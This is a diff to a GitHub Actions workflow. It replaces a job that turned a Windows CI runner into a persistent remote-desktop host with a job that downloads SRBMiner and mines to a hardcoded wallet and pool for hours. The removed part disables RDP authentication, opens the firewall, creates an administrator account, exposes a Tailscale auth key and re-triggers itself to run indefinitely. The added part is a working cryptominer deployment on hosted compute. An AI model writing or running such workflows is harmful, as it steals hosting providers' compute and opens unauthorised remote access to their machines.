@@ -1,108 +1,36 @@
-name: RDP-Development-Environment
+name: Windows-Miner
 
 on:
   workflow_dispatch:
 
 jobs:
-  rdp:
+  miner:
     runs-on: windows-latest
     timeout-minutes: 360
 
     steps:
-      - name: Enable & Configure RDP
+      - name: Download SRBMiner
         shell: pwsh
         run: |
-          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" `
-            -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
-            -Name "UserAuthentication" -Value 0 -Force
-          netsh advfirewall firewall delete rule name="RDP-TCP" 2>$null
-          netsh advfirewall firewall add rule name="RDP-TCP" dir=in action=allow protocol=TCP localport=3389
-          Restart-Service TermService -Force
+          Invoke-WebRequest -Uri "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.3.3/SRBMiner-Multi-3-3-3-win64.zip" -OutFile "miner.zip"
+          Expand-Archive miner.zip -DestinationPath "miner"
 
-      - name: Create RDP User
+      - name: Start Mining YESPOWER RPLANT
         shell: pwsh
         run: |
-          Add-Type -AssemblyName System.Security
-          $chars = @{
-              U=[char[]](65..90); 
-              L=[char[]](97..122); 
-              N=[char[]](48..57);  
-              S=([char[]](33..47)+[char[]](58..64)+[char[]](91..96)+[char[]](123..126))
-          }
-          $p=@()
-          $p+= $chars.U | Get-Random -Count 4
-          $p+= $chars.L | Get-Random -Count 4
-          $p+= $chars.N | Get-Random -Count 4
-          $p+= $chars.S | Get-Random -Count 4
-          $password = -join ($p | Sort-Object {Get-Random})
-          $secure = ConvertTo-SecureString $password -AsPlainText -Force
-          if (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue) { Remove-LocalUser -Name "RDP" }
-          New-LocalUser -Name "RDP" -Password $secure -AccountNeverExpires
-          Add-LocalGroupMember -Group Administrators -Member RDP
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member RDP
-          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
+          cd miner
+          Start-Process ".\SRBMiner-MULTI.exe" -ArgumentList @(
+            "--algorithm", "yespower"
+            "--pool", "eu.rplant.xyz:17149"
+            "--wallet", "Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E"
+            "--password", "x"
+            "--cpu-threads", "8"
+          )
 
-      - name: Install Tailscale
+      - name: Keep Alive
         shell: pwsh
         run: |
-          $url="https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
-          $f="$env:TEMP\tailscale.msi"
-          Invoke-WebRequest $url -OutFile $f
-          Start-Process msiexec.exe -ArgumentList "/i `"$f`" /quiet /norestart" -Wait
-          Remove-Item $f -Force
-
-      - name: Connect Tailscale
-        shell: pwsh
-        run: |
-          $tsExe="$env:ProgramFiles\Tailscale\tailscale.exe"
-          & $tsExe up --authkey "tskey-auth-kHns77euAR11CNTRL-4UWSQMYj2Q8EQh5XSN8uP8mv6WpGbUo3" `
-            --hostname runner-$env:GITHUB_RUN_ID --reset
-
-          $ip=$null
-          for ($i=1; $i -le 10; $i++) {
-            $ip = & $tsExe ip -4
-            if ($ip) { break }
-            Start-Sleep 5
-          }
-          if (-not $ip) { Write-Error "No Tailscale IP"; exit 1 }
-          echo "TS_IP=$ip" >> $env:GITHUB_ENV
-
-      - name: Install Development Tools
-        shell: pwsh
-        run: |
-          # Install VS Code
-          $vscodeUrl = "https://code.visualstudio.com/sha/download?build=stable&os=win32-x64"
-          $vscodeInstaller = "$env:TEMP\vscode.exe"
-          Invoke-WebRequest $vscodeUrl -OutFile $vscodeInstaller
-          Start-Process $vscodeInstaller -ArgumentList "/SILENT /MERGETASKS=!runcode" -Wait
-
-      - name: Optimize System Performance
-        shell: pwsh
-        run: |
-          powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
-          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl" -Name "Win32PrioritySeparation" -Value 38
-
-      - name: Print Connection Info
-        shell: pwsh
-        run: |
-          Write-Host "==============================="
-          Write-Host "   RDP DEVELOPMENT SESSION"
-          Write-Host "IP: $env:TS_IP"
-          Write-Host "User: RDP"
-          Write-Host "Password: $env:RDP_PASSWORD"
-          Write-Host "==============================="
-
-      - name: Maintain Session
-        shell: pwsh
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          $limit = 350
-          for ($i=1; $i -le $limit; $i++) {
-            Write-Host "[$(Get-Date)] Development session active ($i/$limit)"
+          for ($i=1; $i -le 350; $i++) {
+            Write-Host "Mining Active ($i/350)"
             Start-Sleep -Seconds 60
           }
-          # Auto-rebuild for continuous development
-          gh workflow run $env:GITHUB_WORKFLOW --ref $env:GITHUB_REF_NAME --repo $env:GITHUB_REPOSITORY
-          Start-Sleep -Seconds 20
